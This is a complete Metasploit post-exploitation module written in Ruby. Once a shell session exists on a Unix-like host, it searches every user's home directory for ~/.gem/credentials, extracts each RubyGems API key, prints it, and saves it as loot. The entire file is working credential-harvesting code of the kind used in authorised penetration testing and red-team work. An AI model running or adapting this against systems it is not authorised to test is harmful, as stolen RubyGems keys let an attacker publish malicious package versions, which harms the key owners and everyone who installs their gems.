##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Unix

  def initialize(info = {})
    super(update_info(info,
      'Name'         => 'Multi Gather RubyGems API Key',
      'Description'  => %q{
        This module obtains a user's RubyGems API key from ~/.gem/credentials.
      },
      'Author'       => [
        'Jonathan Claudius <jclaudius[at]trustwave.com>',
        'Brandon Myers <bmyers[at]trustwave.com>'
      ],
      'Platform'     => %w{bsd linux osx unix},
      'SessionTypes' => %w{shell},
      'License'      => MSF_LICENSE
    ))
  end

  def run
    print_status('Finding ~/.gem/credentials')
    paths = enum_user_directories.map { |d| d + '/.gem/credentials' }
    paths = paths.select { |f| file?(f) }

    if paths.empty?
      print_error('No users found with a ~/.gem/credentials file')
      return
    end

    download_key(paths)
  end

  # Ruby gem credentials are pretty standard and can come
  # in a few flavors, but the most common are straight yaml
  # and json, both of which are colon delimited. I suppose
  # you could concievably have more than one, but that'd be
  # manually editing, and the first one is probably the best
  # one anyway.
  def extract_key(path)
    data = read_file(path)
    keys = data.split(':').select { |k| k =~ /[0-9a-f]{32}/ }
    keys.map { |k| k.strip }.first
  end

  def download_key(paths)
    print_status("Looting #{paths.count} files")
    paths.each do |path|
      path.chomp!
      next if ['.', '..'].include?(path)

      rubygems_api_key = extract_key(path)
      next unless rubygems_api_key

      print_good("Found a RubyGems API key: #{rubygems_api_key}")

      loot_path = store_loot(
        'rubygems.apikey',
        'text/plain',
        session,
        rubygems_api_key,
        'rubygems_api_key.txt',
        'RubyGems API key'
      )

      print_good("RubyGems API key stored in #{loot_path}")
    end
  end
end
